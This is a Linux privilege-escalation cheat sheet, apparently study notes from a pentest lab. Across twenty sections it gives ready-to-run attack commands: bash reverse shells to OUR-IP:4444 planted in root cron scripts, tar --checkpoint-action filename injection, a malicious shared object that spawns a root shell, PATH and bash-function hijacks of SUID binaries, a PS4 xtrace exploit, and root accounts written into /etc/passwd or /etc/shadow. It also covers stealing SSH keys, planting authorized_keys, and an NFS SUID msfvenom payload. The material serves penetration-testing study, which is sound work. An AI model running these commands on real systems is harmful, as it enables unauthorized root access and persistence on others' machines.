# Linux Privilege Escalation

---

## 1. Service Exploits

*For later.*

---

## 2. Weak File Permissions - Readable `/etc/shadow`

* Crack hashes with tools like `john`, `hashcat`, etc.

---

## 3. Weak File Permissions - Writable `/etc/shadow`

```bash
mkpasswd -m sha-512 <password>
```

* Generate a password hash and write it to the `/etc/shadow` file corresponding to the root or target user.

---

## 4. Weak File Permissions - Writable `/etc/passwd`

* Generate a new password hash with a password of your choice:

```bash
openssl passwd <password>
```

* Open `/etc/passwd` file to edit.
* Replace the `x` in the root line with generated hash or create a new user:

```bash
newroot:GENERATED_HASH:0:0:root:/root:/bin/bash
```

* Now switch to newroot

```bash
su newroot
```

---

## 5. Sudo - Shell Escape Sequences

* List the programs which sudo allows your user to run:

```bash
sudo -l
```

* Visit [GTFOBins](https://gtfobins.github.io) .
* look for some of the program names. If the program is listed with `sudo` as a function, you can use it to elevate privileges, usually via an escape sequence.

### MORE

If a program is listed with `capabilities`, GTFObins can also be useful for finding known exploitation methods. We can check for binaries with capabilities on a machine by `getcap -r / 2>/dev/null` then search for those binaries on GTFOBins.

---

## 6. Sudo - Environment Variables

```bash
sudo -l
```

* Look for use of:

  * `LD_PRELOAD`
  * `LD_LIBRARY_PATH`

*For later.*

---

## 7. Cron Jobs - File Permissions

* There might be cron jobs or Scripts scheduled to run frequently.

```bash
cat /etc/crontab
```

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.


PATH=/home/marcus:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
* * * * * root  overwrite.sh
* * * * * root  /usr/local/bin/compress.sh
```

suppose above one is the output of `cat /etc/crontab`

* Check if one of the file is writable:

```bash
ls -l FILEPATH
```

* if we can modify the file we can do something similar as the following

### Exploit with a reverse shell

FILENAME:

```bash
#!/bin/bash
bash -i >& /dev/tcp/OUR-IP/4444 0>&1
```

Attacker's Machine

```bash
nc -nvlp 4444
```

Now we have to wait for it to be executed automatically as per the schedule.

---

## 8. Cron Jobs - PATH Environment Variable

```bash
cat /etc/crontab
```

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.


PATH=/home/marcus:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
* * * * * root  overwrite.sh
* * * * * root  /usr/local/bin/compress.sh
```

suppose above one is the output of `cat /etc/crontab`

* Here `PATH` variable includes `/home/marcus` while the original `overwrite.sh` is listed without full path and is present somewhere else.
* We can create a new `overwrite.sh` at `/home/marcus` if its writable.
* Crontab will execute our `overwrite.sh` because `/home/marcus` comes first in `PATH` variable.

Exploit:

/home/user/overwrite.sh

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
chmod +x /home/user/overwrite.sh
```

```bash
/tmp/rootbash -p
```

---

## 9. Cron Jobs – Wildcards (`*`)

```bash
cat /usr/local/bin/compress.sh
```

`compress.sh` isn't writable in this scenario.
Content:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

**NOTE:** tar has command line options that let you run other commands as part of a checkpoint feature.

Exploit:

* `shell.sh` is the script to be executed.

```bash
#!/bin/bash
bash -i >& /dev/tcp/OUR-IP/4444 0>&1
```

* Make `shell.sh` executable.

```bash
chmod +x shell.sh
```

* Create these two files in same directory.

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.sh
```

ensure the script is executable.

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

---

## 10. SUID / SGID Executables - Known Exploits

```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null
```

* Search for all files with the SUID or SGID to check known vulnerable binaries and versions at [GTFOBins](https://gtfobins.github.io).

---

## 11. SUID / SGID Executables - Shared Object Injection

If a SUID/SGID binary attempts to load a shared object from an insecure or non-existent path, you may exploit this behavior by injecting a malicious `.so` file to escalate privileges.

### Trace File Access

Use `strace` to identify missing or user-writable shared object paths:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

* Look for `.so` files the binary tries to load but can’t find.
* If it attempts to load a `.so` from a writable path, it's potentially exploitable.

### Create Malicious Shared Object

Write a `.c` file that spawns a shell:

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void spawn_shell() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
```

Compile it:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

> Replace the output path with the one the binary was looking for.

### Execute the SUID Binary

Run the vulnerable binary:

```bash
/usr/local/bin/suid-so
```

If successful, your `.so` file is loaded, and a root shell is spawned.

### Notes

* Binary must be SUID/SGID and load `.so` files insecurely.
* Doesn’t work if paths are sanitized or if secure loader settings are enforced.
* Check SUID bit with:

  ```bash
  ls -l /usr/local/bin/suid-so
  ```

---

## 12. SUID / SGID Executables - Environment Variables

SUID/SGID binaries that call other executables without using full paths can be exploited by modifying the `PATH` environment variable.

### Example Scenario

Use `strings` to inspect the binary:

```bash
strings /usr/local/bin/suid-env
```

If you find something like:

```bash
service apache2 start
```

This means it's calling `service` **without full path** (`/usr/sbin/service`), making it vulnerable.

### Exploitation Steps

1. Create a fake `service` binary:

   ```bash
   echo -e '#!/bin/bash\n/bin/bash' > ./service
   chmod +x ./service
   ```

2. Prepend current directory (`.`) to `PATH` during execution:

   ```bash
   PATH=.:$PATH /usr/local/bin/suid-env
   ```

This tricks the SUID binary into running your fake `service` script, spawning a shell.

Notes

* Only works if the binary doesn't sanitize `PATH`.
* The fake binary must have the same name as the called command.
* `.` must appear **before** system directories in `PATH`.

---

## 13. SUID / SGID - Abusing Shell Features (#1 Bash Function Hijack)

Older Bash versions (< 4.2-048) allow function names to mimic file paths. If a SUID/SGID binary runs a known path (e.g., `/usr/sbin/service`), you can override it with a function.

### Example

Check the binary with:

```bash
strings /usr/local/bin/suid-bash-func
```

Suppose it includes:

```bash
/usr/sbin/service apache2 start
```

### Exploitation

Define a function mimicking the full path:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Run the vulnerable binary:

```bash
/usr/local/bin/suid-bash-func
```

This triggers the exported function instead of the real `/usr/sbin/service`, granting a root shell.

Notes

* Only works in **Bash < 4.2-048**.
* Function path must **exactly match** the command used in the binary.

---

## 14. SUID / SGID - Abusing Shell Features (#2)

In **Bash versions < 4.4**, `PS4` can be abused during debugging to execute arbitrary commands. If a SUID binary runs a Bash script with `-x` (debug mode), this can be exploited.

### Exploit

Run the binary with a crafted `PS4`:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2 
```

* This sets `PS4` to execute a command during each debug trace.
* It copies `/bin/bash` to `/tmp/rootbash` and sets the SUID bit.

Then run the created binary:

```bash
/tmp/rootbash -p
```

This grants a root shell.

Notes

* Only works on **Bash < 4.4**.
* The target binary must use Bash in **debug mode** (`#!/bin/bash -x` or equivalent).

---

## 15. Passwords & Keys - History Files

* If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

```bash
cat ~/.*history | less
```

---

## 16. Passwords & Keys - Config Files

* Look for plaintext credentials in:

  * `~/.mysql_history`
  * `.bashrc`
  * `.env`
  * `.git-credentials`, etc.

---

## 17. Passwords & Keys - SSH Keys

* This step involves grabbing the SSH private key file(eg. id_rsa) of the user (root) which enables us to connect to the target machine via SSH without needing a password.

* We need to modify the permission of the key file

```bash
chmod 600 root_key
```

* Now we just have to connect

```bash
ssh -i root_key root@target
```

## Alternative

* Generate a key pair.

```bash
ssh-keygen
```

* It will generate two keys

```bash
id_rsa and id_rsa.pub
```

* We can try to add our public key to the server.

```bash
cat ~/.ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys
```

---

## 18. NFS Exploits

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user and this method will not be helpful

* Check the NFS share configuration on the target:

```bash
cat /etc/exports
```

* mount the NFS Share on Attacker's Machine:

```bash
sudo mount -o rw,vers=3 IP:/tmp /mnt
```

### Exploits

* Transfer a malicious file to the Share from our machine:

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /mnt/shell.elf
```

* Still using our machine, make the file executable and set the SUID permission:

```bash
chmod +xs /mnt/shell.elf
```

* Back on the target, as the low privileged user, execute the file to gain a root shell:

```bash
/tmp/shell.elf
```

**Note**: SUID works only on compiled binaries (ELF) because the kernel executes them directly. It does not work on scripts (like Bash or Python) because the interpreter runs as the user, not as root. So, use SUID on binaries—not scripts—for privilege escalation.

---

## 19. Kernel Exploits

* Use **only as last resort**.

Tool:

```bash
Linux Exploit Suggester 2
```

---

## 20. Privilege Escalation Scripts

* Use automated scripts to scan for privesc vectors:

  * `LinPEAS`
  * `LES`
  * `Linux Smart Enumeration`
  * `LinEnum`

---
